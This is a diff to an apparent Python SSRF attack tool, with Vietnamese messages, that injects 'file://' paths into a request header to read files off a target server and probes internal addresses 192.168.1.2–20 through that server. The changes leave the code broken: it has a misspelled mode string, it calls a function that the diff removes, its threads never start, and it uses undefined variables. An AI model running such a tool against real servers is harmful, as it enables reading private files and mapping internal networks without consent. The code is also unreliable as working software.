@@ -11,7 +11,7 @@ from PyPDF2 import PdfReader
 results={}
 
 def printBanner() :
-    os.system('clear')
+    os.system('cls')
     print(colored(r"""
 :'######:::'######::'########::'########:'########::'#######:::'#######::'##:::::::
 '##... ##:'##... ##: ##.... ##: ##.....::... ##..::'##.... ##:'##.... ##: ##:::::::
@@ -69,13 +69,14 @@ def getreadfilePayload() :
     except Exception as e:
         print("Đã xảy ra lỗi:", e) 
 
-def doRequest_readfile(requester,parameter,path) :
+def doRequest(requester,parameter,path,mode) :
     url,method,header=requester.values()
-    if(method == 'GET') :
-      print(colored('[TESTING]\t\t','yellow') + path)
-      header[parameter] = "file://" + path
+    if mode == "reafile" :
+         if(method == 'GET') :
+            print(colored('[TESTING]\t\t','yellow') + path)
+            header[parameter] = "file://" + path
 
-      response =requests.get(url,headers=header)
+            response =requests.get(url,headers=header)
     if response.status_code == 200:
         buffer = response.content
         text=""
@@ -88,17 +89,8 @@ def doRequest_readfile(requester,parameter,path) :
             #   print("----------------------------------------")
               global results
               results[path]=text
-        
-def doRequest_scan(requester,parameter,ip) :
-    url,method,header=requester.values()
-    if(method == 'GET') :
-      print(colored('[TESTING]\t\t','yellow') + ip)
-      header[parameter] = "http://" + ip
 
-      response =requests.get(url,headers=header)
-    if response.status_code == 200:
-              global results
-              results[ip]="Found"
+
 
 def attack_readfile() :
         #getreadfilepayload
@@ -124,23 +116,20 @@ def attack_readfile() :
         print(colored("Found {number_result} from payload".format(number_result=len(results)),"green"))  
 
 
-def attack_scan() : 
+def generate_ip() : 
    ip_list = []
    ip_main = "192.168.1."
    for i in range (2,21) : 
         ip_list.append(ip_main+str(i))
-   threads =[]
-   for ip in ip_list : 
-            thread = threading.Thread(target=doRequest_scan,args=(requester,parameter,ip))
-            threads.append(thread)
-            thread.start()
-            
-   for thread in threads :
-            thread.join()
-   
-   for key in results.keys() :
-          print("\n"+colored("Found {ip}".format(ip=key),'yellow')+"\n")
+   return ip_list
 
+def attack_scan() :
+     iplist=generate_ip()
+
+     threads =[]
+     for ip in iplist : 
+            thread = threading.Thread(target=doRequest_readfile,args=(requester,parameter,path))
+            threads.append(thread)
 
     
 if __name__ == "__main__" : 
@@ -164,5 +153,5 @@ if __name__ == "__main__" :
          attack_readfile()
          exit()
     if(len(module) == 1 and module[0] == 'scan') : 
-         attack_scan()
-        
+       
+        print(iplist)
